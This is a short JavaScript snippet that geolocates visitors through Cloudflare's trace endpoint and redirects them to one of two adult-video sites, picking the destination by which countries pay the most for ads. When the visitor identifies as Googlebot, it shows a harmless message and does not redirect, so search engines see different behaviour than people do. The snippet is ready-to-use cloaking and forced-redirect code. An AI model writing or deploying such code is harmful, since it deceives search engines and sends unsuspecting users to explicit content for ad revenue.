const HIGH_CPM_URL = "https://livesexvideo.pages.dev";
const LOW_CPM_URL  = "https://xvideoshub.pages.dev"; 

// Edit this list to match your ad network's top-paying countries
const HIGH_CPM_COUNTRIES = [
  "US", "CA", "GB", "AU", "NZ", "DE", "FR", "NL", "CH",
  "SE", "NO", "DK", "FI", "IE", "AT", "BE", "SG", "JP", "AE"
];

async function getCountry() {
  try {
    const res = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
    const text = await res.text();
    const match = text.match(/loc=([A-Z]{2})/);
    return match ? match[1] : null;
  } catch (e) {
    return null;
  }
}

(async () => {
  if (navigator.userAgent.includes("Googlebot")) {
    console.log("Thanks for visiting my page");
    return;
  }

  const country = await getCountry();
  const target = HIGH_CPM_COUNTRIES.includes(country) ? HIGH_CPM_URL : LOW_CPM_URL;
  window.location.href = target;
})();
